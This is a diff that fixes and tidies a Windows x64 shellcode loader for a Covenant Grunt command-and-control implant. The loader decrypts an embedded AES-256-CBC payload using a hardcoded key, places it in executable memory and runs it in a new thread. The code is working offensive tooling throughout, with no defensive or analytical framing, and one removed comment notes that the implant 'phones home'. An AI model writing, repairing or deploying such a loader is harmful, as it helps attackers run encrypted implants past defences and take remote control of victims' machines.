@@ -1,6 +1,6 @@
-// Covenant Grunt AES-256-CBC Loader (Windows x64)
-// Uses CryptoAPI → decrypt → VirtualAlloc → execute
-// Compile: cl.exe loader.cpp /link advapi32.lib
+// Covenant Grunt AES-256-CBC Encrypted Shellcode Loader (Windows x64)
+// Uses CryptoAPI (advapi32) → decrypt → execute in memory
+// Fixed version - no "jump crosses initialization" errors
 
 #include <windows.h>
 #include <wincrypt.h>
@@ -2712,30 +2712,35 @@ unsigned char encrypted_shellcode[] = {
 
 };
 
-// Your fixed key (exactly as used in Python)
+
+// Fixed key you used in encryption
 static const unsigned char aes_key[32] = {
-    0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,
-    0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,
-    0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,
-    0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
 };
 
 int main(void)
 {
-    HCRYPTPROV hProv = 0;
-    HCRYPTKEY  hKey  = 0;
-    DWORD      dwDataLen = 0;
-    BYTE*      pbData    = NULL;
+    HCRYPTPROV  hProv     = 0;
+    HCRYPTKEY   hKey      = 0;
+    BYTE*       pbData    = NULL;
+    DWORD       dwDataLen = 0;
+    LPVOID      pExec     = NULL;
+    HANDLE      hThread   = NULL;
+    int         result    = 1;  // assume failure
 
-    printf("[+] Starting AES-256-CBC decryption loader...\n");
+    printf("[+] Covenant AES-256-CBC loader starting...\n");
 
-    // ── 1. Get crypto context ──
-    if (!CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+    // ── 1. Acquire crypto context ───────────────────────────────────────
+    if (!CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+    {
         printf("[-] CryptAcquireContext failed: %lu\n", GetLastError());
         return 1;
     }
 
-    // ── 2. Import AES-256 key ──
+    // ── 2. Import AES-256 key ───────────────────────────────────────────
     struct {
         BLOBHEADER hdr;
         DWORD      dwKeySize;
@@ -2746,36 +2751,41 @@ int main(void)
     KeyBlob.hdr.bVersion = CUR_BLOB_VERSION;
     KeyBlob.hdr.reserved = 0;
     KeyBlob.hdr.aiKeyAlg = CALG_AES_256;
-    KeyBlob.dwKeySize    = 32;                  // bytes
+    KeyBlob.dwKeySize    = 32;
     memcpy(KeyBlob.rgbKeyData, aes_key, 32);
 
-    if (!CryptImportKey(hProv, (const BYTE*)&KeyBlob, sizeof(KeyBlob), 0, 0, &hKey)) {
+    if (!CryptImportKey(hProv, (const BYTE*)&KeyBlob, sizeof(KeyBlob), 0, 0, &hKey))
+    {
         printf("[-] CryptImportKey failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
-    // ── 3. Set CBC mode ──
+    // ── 3. Set CBC mode ─────────────────────────────────────────────────
     DWORD dwMode = CRYPT_MODE_CBC;
-    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0)) {
-        printf("[-] CryptSetKeyParam(MODE) failed: %lu\n", GetLastError());
+    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0))
+    {
+        printf("[-] CryptSetKeyParam (mode) failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
-    // ── 4. Set IV (first 16 bytes of blob) ──
-    if (!CryptSetKeyParam(hKey, KP_IV, encrypted_shellcode, 0)) {
-        printf("[-] CryptSetKeyParam(IV) failed: %lu\n", GetLastError());
+    // ── 4. Set IV (first 16 bytes of encrypted_shellcode) ───────────────
+    if (!CryptSetKeyParam(hKey, KP_IV, encrypted_shellcode, 0))
+    {
+        printf("[-] CryptSetKeyParam (IV) failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
-    // ── 5. Prepare buffer (ciphertext only) ──
+    // ── 5. Prepare ciphertext buffer ────────────────────────────────────
     SIZE_T ct_size = sizeof(encrypted_shellcode) - 16;
-    if (ct_size == 0) {
-        printf("[-] No ciphertext\n");
+    if (ct_size == 0 || ct_size % 16 != 0)
+    {
+        printf("[-] Invalid ciphertext size (%zu bytes)\n", ct_size);
         goto cleanup;
     }
 
     pbData = (BYTE*)HeapAlloc(GetProcessHeap(), 0, ct_size);
-    if (!pbData) {
+    if (!pbData)
+    {
         printf("[-] HeapAlloc failed\n");
         goto cleanup;
     }
@@ -2783,40 +2793,53 @@ int main(void)
     memcpy(pbData, encrypted_shellcode + 16, ct_size);
     dwDataLen = (DWORD)ct_size;
 
-    // ── 6. Decrypt in place (CryptoAPI handles PKCS7 unpadding when final=TRUE) ──
-    if (!CryptDecrypt(hKey, 0, TRUE, 0, pbData, &dwDataLen)) {
+    // ── 6. Decrypt (CryptoAPI handles PKCS#7 unpadding) ─────────────────
+    if (!CryptDecrypt(hKey, 0, TRUE, 0, pbData, &dwDataLen))
+    {
         printf("[-] CryptDecrypt failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
-    printf("[+] Decrypted successfully → %lu bytes\n", dwDataLen);
+    printf("[+] Decrypted %lu bytes successfully\n", dwDataLen);
 
-    // ── 7. Allocate + copy + make executable ──
-    LPVOID pExec = VirtualAlloc(NULL, dwDataLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pExec) {
+    // ── 7. Allocate RWX memory and copy shellcode ───────────────────────
+    pExec = VirtualAlloc(NULL, dwDataLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pExec)
+    {
         printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
     memcpy(pExec, pbData, dwDataLen);
 
-    DWORD dwOld;
-    VirtualProtect(pExec, dwDataLen, PAGE_EXECUTE_READ, &dwOld);
+    DWORD dwOldProtect;
+    if (!VirtualProtect(pExec, dwDataLen, PAGE_EXECUTE_READ, &dwOldProtect))
+    {
+        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
+        goto cleanup;
+    }
 
-    printf("[+] Executing shellcode...\n");
+    printf("[+] Shellcode placed in executable memory\n");
 
-    // ── 8. Run it ──
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
-    if (!hThread) {
+    // ── 8. Execute ──────────────────────────────────────────────────────
+    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExec, NULL, 0, NULL);
+    if (!hThread)
+    {
         printf("[-] CreateThread failed: %lu\n", GetLastError());
         goto cleanup;
     }
 
-    WaitForSingleObject(hThread, INFINITE);   // wait forever (Grunt usually phones home)
+    printf("[+] Thread created - waiting for shellcode to exit...\n");
+
+    WaitForSingleObject(hThread, INFINITE);
+    result = 0;  // success
 
 cleanup:
-    if (pbData)    HeapFree(GetProcessHeap(), 0, pbData);
-    if (hKey)      CryptDestroyKey(hKey);
-    if (hProv)     CryptReleaseContext(hProv, 0);
-    return 0;
+    if (hThread)    CloseHandle(hThread);
+    if (pExec)      VirtualFree(pExec, 0, MEM_RELEASE);
+    if (pbData)     HeapFree(GetProcessHeap(), 0, pbData);
+    if (hKey)       CryptDestroyKey(hKey);
+    if (hProv)      CryptReleaseContext(hProv, 0);
+
+    return result;
 }
